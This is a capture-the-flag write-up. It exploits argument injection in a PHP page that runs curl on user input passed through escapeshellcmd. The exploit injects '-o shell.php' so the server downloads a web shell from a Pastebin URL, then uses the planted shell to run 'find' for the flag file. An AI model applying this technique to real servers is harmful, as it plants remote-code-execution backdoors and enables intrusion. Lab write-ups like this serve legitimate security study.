## Description
```php
<html>
    <head></head>
    <link rel="stylesheet" href="/static/bulma.min.css" />
    <body>
        <div class="container card">
        <div class="card-content">
        <h1 class="title">Online Curl Request</h1>
    <?php
        if(isset($_GET['url'])){
            $url = $_GET['url'];
            if(strpos($url, 'http') !== 0 ){
                die('http only !');
            }else{
                $result = shell_exec('curl '. escapeshellcmd($_GET['url']));
                $cache_file = './cache/'.md5($url);
                file_put_contents($cache_file, $result);
                echo "<p>cache file: <a href='{$cache_file}'>{$cache_file}</a></p>";
                echo '<pre>'. htmlentities($result) .'</pre>';
                return;
            }
        }else{
        ?>
            <form>
                <div class="field">
                    <label class="label">URL</label>
                    <input class="input" type="text" placeholder="url" name="url" required>
                </div>
                <div class="control">
                    <input class="button is-success" type="submit" value="submit">
                </div>
            </form>
        <?php
        }
    ?>
        </div>
        </div>
    </body>
</html>
```
There is a online curl request program.

## Vulnerability
Command Injection

escapeshellcmd is just filtering special character for defending command injection, not a arg.  
But we can't use any other command because escapeshellcmd restrict delimeters, so we should use only curl command.  
We should use option for curl, -o <file> is a option that saves server's response body at their locals.  
So, we are going to attack for using web shell.  

## Exploit
<img width="1276" height="595" alt="image" src="https://github.com/user-attachments/assets/982f404f-cbff-4450-ad53-9d79e2553a12" />
First of all, we should have a server that have a web shell text.  
I used PASTEBIN, and we should get a raw url.  

```
https://pastebin.com/raw/LzVLWkDX -o shell.php
```
We should submit that payload, and check saved well.  
And then, that server saved our shell.php.  

```
http://host8.dreamhack.games:17249/cache/shell.php?cmd=
```
Then we can use that file in the server, so we can do path traversal and print out flag file.  

```
cmd=find / -name "*flag*"
```
And in this problem, the flag file is in the root, and that is executable file.  

